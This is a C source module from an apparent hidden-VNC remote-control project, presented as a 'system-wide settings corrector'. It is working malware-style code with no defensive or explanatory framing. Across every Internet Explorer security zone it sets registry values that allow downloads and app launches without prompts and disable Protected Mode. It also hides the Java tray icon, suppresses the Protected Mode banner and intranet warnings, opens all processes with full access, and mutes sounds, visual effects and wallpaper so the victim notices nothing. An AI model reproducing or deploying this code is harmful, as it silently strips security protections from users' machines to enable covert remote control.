//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: system.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	system-wide settings corrector

#include "project.h"
#include "system.h"
#include "commctrl.h"

TCHAR szPolicies[]=_T("Policies");
VOID ChangePowerCfg()
{
	UCHAR bPowerPolicy[0xB0];
	DWORD dwSize=sizeof(bPowerPolicy);
	DWORD dwType;

	HKEY hKey;
	if ( RegOpenKeyEx(HKEY_CURRENT_USER,_T("Control Panel\\PowerCfg\\GlobalPowerPolicy"),0,KEY_WOW64_64KEY | KEY_ALL_ACCESS,&hKey) == NO_ERROR )
	{
		RegQueryValueEx(hKey,szPolicies,NULL,&dwType,bPowerPolicy,&dwSize);

		bPowerPolicy[52]=0x00;
		bPowerPolicy[63]=0x80;
		bPowerPolicy[64]=0x00;
		bPowerPolicy[75]=0x80;
		*(DWORD*)&bPowerPolicy[0xAC]=0x3E0441;

		RegSetValueEx(hKey,szPolicies,0,dwType,bPowerPolicy,dwSize);
		RegCloseKey(hKey);
	}
	return;
}

VOID HideJavaIcon( VOID )
{
	int i;
	for ( i=18; i <= 38; i++)
	{
		HKEY hKey;
		TCHAR szBuf[300];
		wsprintf(szBuf,_T("SOFTWARE\\JavaSoft\\Java Plug-in\\1.6.0_%d"),i);

		if ( RegOpenKeyEx(HKEY_LOCAL_MACHINE,szBuf,0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey) == NO_ERROR )
		{
			DWORD dwOne=0;
			RegSetValueEx(hKey,_T("HideSystemTrayIcon"),0,REG_DWORD,(BYTE*)&dwOne,sizeof(dwOne));
			RegCloseKey(hKey);
		}
	}
}

typedef struct _IE_SHIT
{
	TCHAR *lpName;
	DWORD dwValue;
}IE_SHIT,*PIE_SHIT;

IE_SHIT IEShit[]={
	{_T("1609"),0},
	{_T("1802"),0},
	{_T("1803"),0},
	{_T("1806"),0},
	{_T("1807"),0},
	{_T("1808"),0},
	{_T("2500"),3}
};

VOID DisableIE_SafeMode( VOID )
{
	HKEY hKey;
	int i,j,x;
	DWORD dwIDs[4096]={0},dwRet=0,dwPID=GetCurrentProcessId();

	for ( x=0; x < 2; x++)
	{
		HKEY hRootKey=(x) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
		for ( i=0; i <= 4; i++)
		{
			TCHAR szBuf[300];
			wsprintf(szBuf,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%d"),i);
			if ( RegOpenKeyEx(hRootKey,szBuf,0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey) == NO_ERROR )
			{
				for ( j=0; j < _countof(IEShit); j++){
					RegSetValueEx(
						hKey,IEShit[j].lpName,
						0,REG_DWORD,
						(BYTE*)&IEShit[j].dwValue,
						sizeof(DWORD)
						);
				}
				RegCloseKey(hKey);
			}
		}

		if ( RegOpenKeyEx(hRootKey,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"),0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey) == NO_ERROR )
		{
			DWORD dwDisable=0;
			RegSetValueEx(hKey,_T("WarnOnIntranet"),0,REG_DWORD,(BYTE*)&dwDisable,sizeof(dwDisable));
			RegCloseKey(hKey);
		}

		if ( RegOpenKeyEx(hRootKey,_T("Software\\Microsoft\\Internet Explorer\\Main"),0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey) == NO_ERROR )
		{
			DWORD dwEnabled=1;
			RegSetValueEx(hKey,_T("NoProtectedModeBanner"),0,REG_DWORD,(BYTE*)&dwEnabled,sizeof(dwEnabled));
			RegCloseKey(hKey);
		}
	}
	
	if ( EnumProcesses(dwIDs,sizeof(dwIDs),&dwRet) )
	{
		for ( i=0; i < (int)(dwRet/sizeof(DWORD)); i++)
		{
			HANDLE hProc;
			if (dwIDs[i] == dwPID)
				continue;

			hProc = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwIDs[i]);
			if (hProc)
			{
				//TCHAR szName[MAX_PATH];
				//GetProcessImageFileName(hProc,szName,sizeof(szName)/sizeof(szName[0])-1);
				//if (StrStrI(szName,_T("iexplore.exe"))){
				//	TerminateProcess(hProc,0);
				//}
				CloseHandle(hProc);
			}
		}
	}
}

static TCHAR szPrevSchemeKey[]=_T(".Prev");
static TCHAR szCurSchemeKey[]=_T(".current");

VOID EnableSystemSounds(BOOL bEnable)
{
	if (bEnable){
		RegMoveFromKeyToKey(szPrevSchemeKey,szCurSchemeKey);
	}
	else {
		RegMoveFromKeyToKey(szCurSchemeKey,szPrevSchemeKey);
	}
	return;
}

typedef struct _SPI_INFO
{
	UINT uiAction;
	LPVOID pvParam;
}SPI_INFO,*PSPI_INFO;

SOUNDSENTRY seInfo={sizeof(seInfo)};
SPI_INFO siInfo[]={
	{SPI_SETMENUANIMATION,NULL},
	{SPI_SETSHOWSOUNDS,NULL},
	{SPI_SETSOUNDSENTRY,&seInfo},
	{SPI_SETFOREGROUNDLOCKTIMEOUT,(LPVOID)1},
	{SPI_SETFOREGROUNDFLASHCOUNT,(LPVOID)1},
	{SPI_SETBEEP,NULL},
	{SPI_SETCOMBOBOXANIMATION,NULL},
	{SPI_SETTOOLTIPANIMATION,NULL},
	{SPI_SETSELECTIONFADE,NULL},
	{SPI_SETLISTBOXSMOOTHSCROLLING,NULL},
	{SPI_SETHOTTRACKING,NULL},
	{SPI_SETGRADIENTCAPTIONS,NULL},
	{SPI_SETCLIENTAREAANIMATION,NULL},
	{SPI_SETDISABLEOVERLAPPEDCONTENT,NULL}
};

VOID DisableSystemEffects( VOID )
{
	unsigned i;
	for ( i=0; i < _countof(siInfo); i++){
		SystemParametersInfo(siInfo[i].uiAction,0,siInfo[i].pvParam,SPIF_SENDCHANGE);
	}
	//ChangePowerCfg();
	EnableSystemSounds(FALSE);
}

#ifndef LVS_EX_TRANSPARENTBKGND
	#define LVS_EX_TRANSPARENTBKGND 0x00400000  // Background is painted by the parent via WM_PRINTCLIENT
#endif

#ifndef LVS_EX_TRANSPARENTSHADOWTEXT
	#define LVS_EX_TRANSPARENTSHADOWTEXT 0x00800000  // Enable shadow text on transparent backgrounds only (useful with bitmaps)
#endif

BOOL RemoveWallpaper( DWORD h, DWORD w )
{
	LVBKIMAGE lvBK = {0};
	HWND hDeskListView,hDefView,hProgmanWnd;
	HDC hDC = NULL,hDC2 = NULL;
	HBITMAP hBM = NULL;
	BOOL fbResult = FALSE;

	do 
	{
		hDC = GetDC( NULL );
		if ( !hDC ){
			break;
		}
		hDC2 = CreateCompatibleDC( hDC );
		if ( !hDC2 ){
			break;
		}
		hBM = CreateCompatibleBitmap( hDC2, w, h );
		if ( !hBM ){
			break;
		}
		SelectObject( hDC2, hBM );

		hProgmanWnd   = FindWnd(NULL,_T("Progman"),_T("Program Manager"));
		if ( hProgmanWnd == NULL ){
			break;
		}
		hDefView      = FindWnd(hProgmanWnd,_T("SHELLDLL_DefView"),NULL);
		if ( hDefView == NULL ){
			break;
		}
		hDeskListView = FindWnd(hDefView,_T("SysListView32"),_T("FolderView"));
		if ( hDeskListView == NULL ){
			break;
		}
		// reset transparency
		ListView_SetExtendedListViewStyleEx(
			hDeskListView,
			LVS_EX_TRANSPARENTBKGND | LVS_EX_TRANSPARENTSHADOWTEXT,
			~(LVS_EX_TRANSPARENTBKGND|LVS_EX_TRANSPARENTSHADOWTEXT)
			);
		SetWindowLong(hProgmanWnd,GWL_STYLE,GetWindowLong(hProgmanWnd,GWL_STYLE)|WS_VISIBLE);
		SetWindowLong(hDefView,GWL_STYLE,GetWindowLong(hDefView,GWL_STYLE)|WS_VISIBLE);
		SetWindowLong(hDeskListView,GWL_STYLE,GetWindowLong(hDeskListView,GWL_STYLE)|WS_VISIBLE);
		// remove bkg image
		lvBK.ulFlags = LVBKIF_SOURCE_HBITMAP;
		lvBK.hbm = hBM;
		fbResult = ListView_SetBkImage (hDeskListView,&lvBK);
	}while ( FALSE );

	if ( hBM ){
		DeleteObject(hBM);
	}
	if ( hDC2 ){
		DeleteDC(hDC2);
	}
	if ( hDC ){
		ReleaseDC(NULL,hDC);
	}
	return fbResult;
}

